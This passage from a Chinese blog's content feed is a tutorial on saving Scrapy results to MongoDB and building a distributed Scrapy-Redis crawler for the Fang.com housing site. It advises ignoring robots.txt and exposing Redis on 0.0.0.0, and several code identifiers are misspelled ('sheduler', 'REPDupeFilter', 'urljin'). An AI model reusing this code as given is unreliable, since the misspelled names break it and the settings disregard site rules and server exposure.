class="token string">"bai"</span>,<span class="token string">"age"</span>:19<span class="token punctuation">}</span>data2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"yang"</span>,<span class="token string">"age"</span>:12<span class="token punctuation">}</span>student.insert_one<span class="token punctuation">(</span>data1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#插入一个文档</span>student.insert_many<span class="token punctuation">(</span><span class="token punctuation">[</span>data1,data2<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#插入多个文档</span></code></pre></li><li><p>查找文档</p><pre class=" language-bash"><code class="language-bash">target <span class="token operator">=</span> student.find_one<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bai"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>target <span class="token operator">=</span> student.find<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bai"</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li><li><p>获取文档</p><pre class=" language-bash"><code class="language-bash">result <span class="token operator">=</span> student.next<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#一个文档一个文档的取出</span></code></pre></li><li><p>删除文档</p><pre class=" language-bash"><code class="language-bash">student.remove<span class="token punctuation">(</span>data1<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#以文档对象的形式删除</span>student.remove<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bai"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#以field筛选删除</span></code></pre></li><li><p>打印文档</p><pre class=" language-bash"><code class="language-bash">target1 <span class="token operator">=</span> student.find_one<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bai"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#返回一个文档直接打印</span>print<span class="token punctuation">(</span>target1<span class="token punctuation">)</span>target2 <span class="token operator">=</span> list<span class="token punctuation">(</span>student.find<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"bai"</span><span class="token punctuation">}</span><span class="token punctuation">))</span> <span class="token comment" spellcheck="true">#返回多个文档使用list()函数或循环</span></code></pre></li></ol><h2 id="爬虫爬取信息存放到mongoDB里"><a href="#爬虫爬取信息存放到mongoDB里" class="headerlink" title="爬虫爬取信息存放到mongoDB里"></a>爬虫爬取信息存放到mongoDB里</h2><p>创建一个爬虫(见爬虫篇)，</p><h3 id="spider-py"><a href="#spider-py" class="headerlink" title="spider.py"></a>spider.py</h3><ol><li>先爬取网页，提取要存储进MongoDB的数据</li><li>将提取到数据使用zip进行打包<pre class=" language-bash"><code class="language-bash"> def parse<span class="token punctuation">(</span>self, response<span class="token punctuation">)</span>:     download_urls <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='cont']/ul//a[@class='btn-b']/@href"</span><span class="token punctuation">)</span>.extract<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 获取整页下载链接用getall()</span>     names <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='cont']//em//text()"</span><span class="token punctuation">)</span>.extract<span class="token punctuation">(</span><span class="token punctuation">)</span>     update_times <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='cont']//span[@class='ml10']//text()"</span><span class="token punctuation">)</span>.extract<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#将上面抓取到的元素打包成元组</span>     <span class="token keyword">for</span> download_url,name,update_time <span class="token keyword">in</span> zip<span class="token punctuation">(</span>download_urls,names,update_times<span class="token punctuation">)</span>:         yield <span class="token punctuation">{</span>             <span class="token string">"name"</span>:name,             <span class="token string">"download_url"</span>:download_url,             <span class="token string">"update_time"</span>:update_time,         <span class="token punctuation">}</span></code></pre></li></ol><h3 id="pipelines-py"><a href="#pipelines-py" class="headerlink" title="pipelines.py"></a>pipelines.py</h3><ol><li>连接mongoDB</li><li>向对应的集合中插入文档</li><li>关闭mongoDB连接<pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> pymongoclass MongodbPipeline<span class="token punctuation">(</span>object<span class="token punctuation">)</span>: <span class="token comment" spellcheck="true">#连接MongoDB</span> def open_spider<span class="token punctuation">(</span>self,spider<span class="token punctuation">)</span>:     self.client <span class="token operator">=</span> pymongo.MongoClient<span class="token punctuation">(</span><span class="token punctuation">)</span> def process_item<span class="token punctuation">(</span>self, item, spider<span class="token punctuation">)</span>:     self.client.s2345.softInfo.insert_one<span class="token punctuation">(</span>item<span class="token punctuation">)</span>     <span class="token keyword">return</span> item <span class="token comment" spellcheck="true">#关闭MongoDB</span> def close_spider<span class="token punctuation">(</span>self,spider<span class="token punctuation">)</span>:     self.client.close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ol><h3 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h3><p>改robots/item_pipelines/user-agent</p><pre class=" language-bash"><code class="language-bash">ITEM_PIPELINES <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'xx.pipelines.MongodbPipeline'</span><span class="token keyword">:</span> 300,<span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 项目开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> MongoDB </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式爬虫</title>
      <link href="/2020/05/15/scrapy2/"/>
      <url>/2020/05/15/scrapy2/</url>
      
        <content type="html"><![CDATA[<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>redis是一种支持分布式的nosql数据库，他的数据是保存在内存中的，同时redis可以定时把内存数据同步到磁盘，即可以将数据持久化。</p><h3 id="分布式爬虫架构"><a href="#分布式爬虫架构" class="headerlink" title="分布式爬虫架构"></a>分布式爬虫架构</h3><ol><li>核心服务器：一台master，用于启动爬虫，爬虫开始的url以及爬虫爬取的数据都保存在此主机中</li><li>跑爬虫程序的机器：多个slave(叶子节点)，用于爬取数据</li></ol><p>我们在Master上搭建一个Redis数据库(此数据库只用作url的存储)，并对每个需要爬取的网站类型都开辟一个单独的列表字段，通过设置slave上的scrapy-redis获取Url的地址为master地址，这样的结果就是：尽管有多个slave，然而大家获取url的地方只有一个，那就是服务器master上的redis数据库。</p><p>并且，由于scrapy-redis自身的队列机制，slave获取的链接不会相互冲突，这样各个slave在完成抓取任务后，再把获取的结果汇总到服务器上</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ol><li>登录会话机制：存储在redis中，数据不会丢失</li><li>排行榜/计数器：实时热搜榜，文章阅读量</li><li>作为消息队列</li><li>当前在线人数</li><li>一些常用的数据缓存</li><li>把前200篇文章缓存或评论缓存：一般用户浏览网站，只会浏览前面一部分的文章或评论，那么可以把前面的200篇文章和对应的评论缓存起来，不用每次请求数据库</li><li>好友关系：微博的好友关系使用redis实现</li><li>发布和订阅功能：可以用来做聊天软件</li></ol><h2 id="Scrapy-Redis分布式爬虫组件"><a href="#Scrapy-Redis分布式爬虫组件" class="headerlink" title="Scrapy=-Redis分布式爬虫组件"></a>Scrapy=-Redis分布式爬虫组件</h2><p>Scrapy是一个框架，他本身是不支持分布式的，如果我们想要分布式的爬虫，就需要一个叫做Scrapy-Redos的组件，这个组件利用了Redis可以分布式的功能，集成到Scrapy框架中，使得爬虫可以进行分布式。可以充分利用多个资源(多个ip、多带宽、同步爬取)来提高爬虫的爬行效率。</p><h3 id="分布式爬虫的优点"><a href="#分布式爬虫的优点" class="headerlink" title="分布式爬虫的优点"></a>分布式爬虫的优点</h3><ul><li>可以充分利用多台机器的带宽</li><li>可以充分利用多台机器的Ip地址</li><li>多台机器，爬取效率更高</li></ul><h3 id="分布式爬虫必须解决的问题"><a href="#分布式爬虫必须解决的问题" class="headerlink" title="分布式爬虫必须解决的问题"></a>分布式爬虫必须解决的问题</h3><ul><li>分布式爬虫是好几台机器在同时运行，如何保证在不同的机器爬取页面时不会出现重复爬取的问题</li><li>分布爬虫在不同的机器上运行，在把数据爬完后如何保证保存在同一个地方</li></ul><h3 id="分布式爬虫架构-1"><a href="#分布式爬虫架构-1" class="headerlink" title="分布式爬虫架构"></a>分布式爬虫架构</h3><ul><li>Redis服务器：不运行爬虫代码，作用是管理爬虫服务器请求的URL并去重，存储爬虫服务器爬下来的数据(存在内存里)</li><li>爬虫服务器：从Redis获取请求，把爬取下来的数据送给Redis服务器</li></ul><h2 id="其他机器访问本机Redis服务器"><a href="#其他机器访问本机Redis服务器" class="headerlink" title="其他机器访问本机Redis服务器"></a>其他机器访问本机Redis服务器</h2><p>想要让其他机器访问本机的Redis服务器，要么修改redis.conf的配置文件，将bind[本机ip地址/0.0.0.0]，其他机器才能访问</p><blockquote><p>注：bind绑定的是本机网卡的ip地址，而不是想让其他机器连接的ip地址。如果有多块网卡，那么可以绑定多个网卡的ip地址，如果绑定的ip地址是0.0.0.0，那么意味着其他机器可以同通过本机所有的ip地址进行访问。</p></blockquote><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><ol><li>在windows打开redis-server</li><li>在虚拟机(Kali)中连接windows服务器<pre class=" language-bash"><code class="language-bash">redis-cli -h windows的IP地址 -p 6379</code></pre><img src="https://pic.downk.cc/item/5ec0c817c2a9a83be5fadbfd.png" alt=""></li></ol><h2 id="Redis操作"><a href="#Redis操作" class="headerlink" title="Redis操作"></a>Redis操作</h2><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>类似于python的列表，redis以键key-值value方式存储</p><ol><li><p>向key列表左侧加入一个值：</p><pre class=" language-bash"><code class="language-bash">lpush key value <span class="token comment" spellcheck="true">#key表示一个列表</span>lpush websites baidu.com</code></pre></li><li><p>向key列表右侧加入一个元素：</p><pre class=" language-bash"><code class="language-bash">rpush key valuerpush websites google.com</code></pre></li><li><p>打印key列表的元素：</p><pre class=" language-bash"><code class="language-bash">lrange websites 范围lrange websites 0 -1   <span class="token comment" spellcheck="true">#打印列表所有元素</span></code></pre></li><li><p>移除并返回列表最左侧的元素：</p><pre class=" language-bash"><code class="language-bash">lpop key lpop websites</code></pre></li><li><p>移除并返回列表最右侧的元素：</p><pre class=" language-bash"><code class="language-bash">rpop keyrpop websites</code></pre></li><li><p>移除列表指定位置的元素：</p><pre class=" language-bash"><code class="language-bash">lrem key count valuelrem websites 1 baidu.com</code></pre></li></ol><blockquote><p>注：根据参数count的值，移除列表中与参数value相等的元素，count的值可以是以下几种： 1.count&gt;0:从表头开始向表尾搜索，移除与value相等的元素，移除的数量为count   2. count&lt;0:从表尾开始向表头搜索，移除与value相等的元素，移除的数量为count的绝对值。  3.count=0,移除表中所有与value相等的值</p></blockquote><ol start="7"><li><p>指定返回第几个元素：</p><pre class=" language-bash"><code class="language-bash">lindex key indexlindex websites 1</code></pre></li><li><p>获取列表中的元素个数：</p><pre class=" language-bash"><code class="language-bash">llen keyllen websites</code></pre></li></ol><h3 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h3><p>集合与python的集合相同，集合与列表的不同：</p><ul><li>集合是无序的，列表是有序的</li><li>集合的元素是唯一的，列表的元素可以重复</li></ul><ol><li><p>添加元素</p><pre class=" language-bash"><code class="language-bash">sadd <span class="token keyword">set</span> value2 <span class="token comment" spellcheck="true">#set表述集合</span>sadd team zby</code></pre></li><li><p>查看元素：</p><pre class=" language-bash"><code class="language-bash">smembers <span class="token keyword">set</span>smembers team</code></pre></li><li><p>查看集合中的元素个数：</p><pre class=" language-bash"><code class="language-bash">scard <span class="token keyword">set</span>scard team</code></pre></li><li><p>获取多个集合的交集：</p><pre class=" language-bash"><code class="language-bash">sinter set1 set2sinter team1 team2</code></pre></li><li><p>获取多个集合的并集：</p><pre class=" language-bash"><code class="language-bash">sunion set1 set2sunion team1 team2</code></pre></li><li><p>获取多个集合的差集：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sdiff</span> set1 set2<span class="token function">sdiff</span> team1 team2</code></pre></li></ol><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>在房天下(<a href="http://www.fang.com" target="_blank" rel="noopener">www.fang.com</a> )分布式爬虫</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h4><ol><li>获取所有城市的url链接<br><a href="https://www.fang.com/SoufunFamily.htm" target="_blank" rel="noopener">https://www.fang.com/SoufunFamily.htm</a></li><li>获取所有城市的新房的url链接<br>例如：深圳新房：<a href="https://newhouse.sz.fang.com/house/s" target="_blank" rel="noopener">https://newhouse.sz.fang.com/house/s</a></li></ol><blockquote><p>注：以上城市的url对北京不适用，北京的链接没有城市前缀</p></blockquote><h4 id="创建爬虫项目"><a href="#创建爬虫项目" class="headerlink" title="创建爬虫项目"></a>创建爬虫项目</h4><ol><li>将开始爬取的url改为 <a href="https://www.fang.com/SoufunFamily.htm" target="_blank" rel="noopener">https://www.fang.com/SoufunFamily.htm</a></li><li>找到包含城市的html框架，分析每个城市元素的html架构：</li></ol><ul><li>找到最上层的html标签：发现整个城市名的框架处于一个div标签中</li><li>所有城市处于一个table标签中</li><li>每一行是一个tr标签</li><li>每行中包含三个td标签，分别对应字母/省份/城市</li><li>在第三个td标签中包含a标签，每个a标签为一个城市名</li></ul><ol start="3"><li><p>sfw.py 获取城市链接,返回城市/链接</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> re def parse<span class="token punctuation">(</span>self, response<span class="token punctuation">)</span>:     trs <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='outCont']//tr"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取最外层div中的每个tr标签</span>     province <span class="token operator">=</span> None     <span class="token keyword">for</span> <span class="token function">tr</span> <span class="token keyword">in</span> trs:  <span class="token comment" spellcheck="true">#遍历每个tr标签</span>         <span class="token comment" spellcheck="true">#筛选我们的要的标签，即第三个td标签，根据第三个td属性进行筛选</span>         tds <span class="token operator">=</span> tr.xpath<span class="token punctuation">(</span><span class="token string">".//td[not(@class)]"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#没有class标签，筛掉第一个td</span>         province_td <span class="token operator">=</span> tds<span class="token punctuation">[</span>0<span class="token punctuation">]</span>         province_text <span class="token operator">=</span> province_td.xpath<span class="token punctuation">(</span><span class="token string">".//text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取第二个td内容</span>         province_text <span class="token operator">=</span> re.sub<span class="token punctuation">(</span>r<span class="token string">"\s"</span>,<span class="token string">""</span>,province_text<span class="token punctuation">)</span>         <span class="token keyword">if</span> province_text:             province <span class="token operator">=</span> province_text <span class="token comment" spellcheck="true">#如果有省份就替换省份</span>         <span class="token keyword">if</span> province <span class="token operator">==</span> <span class="token string">"其它"</span><span class="token keyword">:</span>   <span class="token comment" spellcheck="true">#不爬取国外网站</span>             <span class="token keyword">continue</span>         city_td <span class="token operator">=</span> tds<span class="token punctuation">[</span>1<span class="token punctuation">]</span>         city_links <span class="token operator">=</span> city_td.xpath<span class="token punctuation">(</span><span class="token string">".//a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#提取所有a标签</span>         <span class="token keyword">for</span> city_link <span class="token keyword">in</span> city_links:             city <span class="token operator">=</span> city_link.xpath<span class="token punctuation">(</span><span class="token string">".//text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取城市名字</span>             city_url <span class="token operator">=</span> city_link.xpath<span class="token punctuation">(</span><span class="token string">".//@href"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取城市url</span>             <span class="token comment" spellcheck="true">#构建新房的url链接</span>             url_module<span class="token operator">=</span> city_url.split<span class="token punctuation">(</span><span class="token string">"//"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将url以//进行分割</span>             first <span class="token operator">=</span> url_module<span class="token punctuation">[</span>0<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#分割http</span>             second <span class="token operator">=</span> url_module<span class="token punctuation">[</span>1<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#分割域名</span>             list1 <span class="token operator">=</span> second.split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>             location <span class="token operator">=</span> list1<span class="token punctuation">[</span>0<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#获取域名中的城市名字</span>             fang <span class="token operator">=</span> list1<span class="token punctuation">[</span>1<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#获取域名中fang</span>             com <span class="token operator">=</span> list1<span class="token punctuation">[</span>2<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#获取域名中com</span>             newhouse_url <span class="token operator">=</span> first + <span class="token string">"//"</span>+location+<span class="token string">".newhouse."</span>+fang+<span class="token string">"."</span>+com+<span class="token string">"house/s/"</span>             yield scrapy.Request<span class="token punctuation">(</span>url<span class="token operator">=</span>newhouse_url,callback<span class="token operator">=</span>self.parse_newhouse,meta<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"info"</span>:<span class="token punctuation">(</span>province,city<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#以该参数的形式方式请求并调用parse_newhouse函数</span> def parse_newhouse<span class="token punctuation">(</span>self,response<span class="token punctuation">)</span>:     province,city<span class="token operator">=</span> response.meta.get<span class="token punctuation">(</span><span class="token string">'info'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#将上一个省份和城市传递到这个函数来使用</span>     <span class="token comment" spellcheck="true">#详细代码见下文</span>     pass</code></pre></li><li><p>items.py 进行绑定</p><pre class=" language-bash"><code class="language-bash">class NewHouseItem<span class="token punctuation">(</span>scrapy.Item<span class="token punctuation">)</span>: <span class="token comment" spellcheck="true"># define the fields for your item here like:</span> <span class="token comment" spellcheck="true"># name = scrapy.Field()</span> province <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span> city <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span> name <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#小区名字</span> price <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#价格</span> rooms <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#有几居</span> area <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#面积</span> address <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#地址</span> sale <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#是否在售</span> origin_url <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#详情页面的url</span></code></pre></li><li><p>sfw.py 处理新房的函数</p><pre class=" language-bash"><code class="language-bash">from fang.items <span class="token function">import</span> NewHouseItem  def parse_newhouse<span class="token punctuation">(</span>self,response<span class="token punctuation">)</span>:     province,city<span class="token operator">=</span> response.meta.get<span class="token punctuation">(</span><span class="token string">'info'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#将上一个省份和城市传递到这个函数来使用</span>     lis <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">".//div[contains(@class,'nl_con')]/ul/li"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#div下包含nl_con的类下的ul下的li</span>     <span class="token keyword">for</span> li <span class="token keyword">in</span> lis:         name<span class="token operator">=</span>li.xpath<span class="token punctuation">(</span><span class="token string">".//div[@class='nlcd_name']/a/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>         rooms <span class="token operator">=</span> li.xpath<span class="token punctuation">(</span><span class="token string">".//div[contains(@class,'house_type')]/a/text()"</span><span class="token punctuation">)</span>.getall<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#获取div下标签a的所有文本，/text()表示获取子标签下的文本</span>         area <span class="token operator">=</span> <span class="token string">""</span>.join<span class="token punctuation">(</span>li.xpath<span class="token punctuation">(</span><span class="token string">".//div[contains(@class,'house_type')]/text()"</span><span class="token punctuation">)</span>.getall<span class="token punctuation">(</span><span class="token punctuation">))</span>   <span class="token comment" spellcheck="true">#获取面积 join转换为字符串，没有join会有换行符</span>         area <span class="token operator">=</span> re.sub<span class="token punctuation">(</span>r<span class="token string">"\s|－|/"</span>,<span class="token string">""</span>,area<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#去除多余字符</span>         address <span class="token operator">=</span> <span class="token string">""</span>.join<span class="token punctuation">(</span>li.xpath<span class="token punctuation">(</span><span class="token string">".//div[@class='address']/a/text()"</span><span class="token punctuation">)</span>.getall<span class="token punctuation">(</span><span class="token punctuation">))</span>         address <span class="token operator">=</span>re.sub<span class="token punctuation">(</span>r<span class="token string">"\s"</span>,<span class="token string">""</span>,address<span class="token punctuation">)</span>         sale <span class="token operator">=</span> li.xpath<span class="token punctuation">(</span><span class="token string">".//div[@class='fangyuan']/span/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>         price <span class="token operator">=</span> <span class="token string">""</span>.join<span class="token punctuation">(</span>li.xpath<span class="token punctuation">(</span><span class="token string">".//div[@class='nhouse_price']//text()"</span><span class="token punctuation">)</span>.getall<span class="token punctuation">(</span><span class="token punctuation">))</span>   <span class="token comment" spellcheck="true">#获取同级标签的所有文本需要//text().getall()</span>         price <span class="token operator">=</span> re.sub<span class="token punctuation">(</span>r<span class="token string">"\s"</span>,<span class="token string">""</span>,price<span class="token punctuation">)</span>         origin_url <span class="token operator">=</span> li.xpath<span class="token punctuation">(</span><span class="token string">".//div[@class='nlcd_name']/a/@href"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>         item <span class="token operator">=</span> NewHouseItem<span class="token punctuation">(</span>name<span class="token operator">=</span>name,rooms<span class="token operator">=</span>rooms,area<span class="token operator">=</span>area,address<span class="token operator">=</span>address,                             sale<span class="token operator">=</span>sale,price<span class="token operator">=</span>price,origin_url<span class="token operator">=</span>origin_url,               province<span class="token operator">=</span>province,city<span class="token operator">=</span>city<span class="token punctuation">)</span>         yield item     next_url <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='page']/a[@class='next']/@href"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> next_url:         yield scrapy.Request<span class="token punctuation">(</span>url<span class="token operator">=</span>response.urljin<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span>,callback<span class="token operator">=</span>self.parse_newhouse<span class="token punctuation">(</span><span class="token punctuation">)</span>,                              meta<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"info"</span>:<span class="token punctuation">(</span>province,city<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#请求下一页的url同样调用新房函数处理，并传递省份城市的参数</span></code></pre></li></ol><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="分布式爬虫架构-2"><a href="#分布式爬虫架构-2" class="headerlink" title="分布式爬虫架构"></a>分布式爬虫架构</h3><ol><li>核心服务器：一台master，用于启动爬虫，爬虫开始的url以及爬虫爬取的数据都保存在此主机中</li><li>跑爬虫程序的机器：多个slave(叶子节点)，用于爬取数据</li></ol><p>在master服务器上搭建一个redis数据库，并将要抓取的url存放到redis数据库中，所有的slave爬虫服务器在抓取的时候从redis数据库中去链接，由于scrapy_redis自身的队列机制，slave获取的url不会相互冲突，然后抓取的结果最后都存储到数据库中。master的redis数据库中还会将抓取过的url的指纹存储起来，用来去重。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><ol><li>使用三台机器，一台win10,两台kali linux，分别在两台Linux上进行分布式抓取</li><li>win10的ip地址为192.168.1.152，用来作为redis的master端，linux机器作为slave</li><li>master的爬虫运行时会把提取到的Url封装成request放到redis数据库：”dmoz:requests”，并且从该数据库中提取request后下载网页，再把网页的内容放到redis的另一个数据库中”dmoz:items”</li><li>slave从master的redis去除待抓取的request，下载完网页后就把网页的内容送回master的redis</li><li>重复上面的3和4，直到master的redis中的”dmoz:dupfilter”是用来存储抓取过的url的指纹(使用哈希函数将url运算后的结果)，是防止重复抓取的</li></ol><h3 id="linux环境搭建"><a href="#linux环境搭建" class="headerlink" title="linux环境搭建"></a>linux环境搭建</h3><ol><li>安装python环境:kali默认安装python3 </li><li>安装scrapy-redis：<br>在终端输入以下命令：<pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> scrapy-redis</code></pre></li><li>克隆以上虚拟机</li></ol><h3 id="winodws"><a href="#winodws" class="headerlink" title="winodws"></a>winodws</h3><h4 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h4><p>redis默认只支持Linux,如果要在windows里安装需要去github里进行下载：<a href="http://www.github.com/MicrosoftArchive/redis/releases" target="_blank" rel="noopener">www.github.com/MicrosoftArchive/redis/releases</a><br>安装之后打开cmd，进入到redis安装的上一级文件夹下执行以下命令，打开redis服务器,或者直接点击redis-server.exe</p><pre class=" language-bash"><code class="language-bash">redis-server.exe redis.windows.conf</code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><h5 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h5><p>直接点击redis-cli.exe,或者重新打开一个cmd进入redis安装的上一级文件夹，连接redis服务器：</p><pre class=" language-bash"><code class="language-bash">redis-cli</code></pre><p><img src="https://pic.downk.cc/item/5ebf9078c2a9a83be5cf1c68.png" alt=""></p><h3 id="分布式爬虫部署"><a href="#分布式爬虫部署" class="headerlink" title="分布式爬虫部署"></a>分布式爬虫部署</h3><p>要将一个scrapy项目变成一个scrapy-redis 项目只需修改以下三点：</p><ol><li>将爬虫的类从scrapy.Spider变成scrapy_redis.spider.RedisSpider或者从scrapy.CrawlSpider变成scrapy_redis.spiders.RdiesCrwalSpider(见下文spider.py)</li><li>将爬虫中的start_urls删掉，增加一个redis_key=”xxx”,这个redis_key是为了以后在redis中控制爬虫启动的。爬虫的第一个url，就是在redis中通过这个发送出去的。</li><li>在settings.py文件中增加配置(见下文settings.py)</li></ol><h4 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h4><p>修改robot/user-agent/item_pipelines</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#确保request存储在redis中</span>SCHEDULER <span class="token operator">=</span> <span class="token string">"scrapy_redis.sheduler.Scheduler"</span><span class="token comment" spellcheck="true">#确保所有爬虫共享相同的去重指纹</span>DUPEFILTER_CLASS <span class="token operator">=</span> <span class="token string">"scrapy_redis.dupefilter.REPDupeFilter"</span><span class="token comment" spellcheck="true">#设置redis为item pipelins</span>ITEM_PIPELINES <span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'scrapy_redis.pipelines.RedisPipeline'</span>:300<span class="token punctuation">}</span><span class="token comment" spellcheck="true">#在redis中保持scrapy-redis用到的队列，不会清理redis中的队列，从而可以实现暂停和恢复的功能</span>SCHEDULER_PERSIST <span class="token operator">=</span> True<span class="token comment" spellcheck="true">#设置连接redis信息</span>REDIS_HOST <span class="token operator">=</span> <span class="token string">'redis服务器所在主机的ip地址'</span>REDIS_PORT <span class="token operator">=</span> 6379</code></pre><h4 id="spider-py"><a href="#spider-py" class="headerlink" title="spider.py"></a>spider.py</h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token function">import</span> scrapyfrom scrapy.linkextractors <span class="token function">import</span> LinkExtractorfrom scrapy.spiders <span class="token function">import</span> CrawlSpider, Rulefrom scrapy_redis.spiders <span class="token function">import</span> RedisCrawlSpiderclass A2345SpiderSpider<span class="token punctuation">(</span>RedisCrawlSpider<span class="token punctuation">)</span>:    name <span class="token operator">=</span> <span class="token string">'2345_spider'</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'ruanjian.2345.cc'</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#start_urls = ['http://ruanjian.2345.cc/list/0_0_2_1.html']</span>    redis_key <span class="token operator">=</span> <span class="token string">'t2345:start_urls'</span>    rules <span class="token operator">=</span> <span class="token punctuation">(</span>        Rule<span class="token punctuation">(</span>LinkExtractor<span class="token punctuation">(</span>allow<span class="token operator">=</span>r<span class="token string">'/list/.+\.html'</span><span class="token punctuation">)</span>, callback<span class="token operator">=</span><span class="token 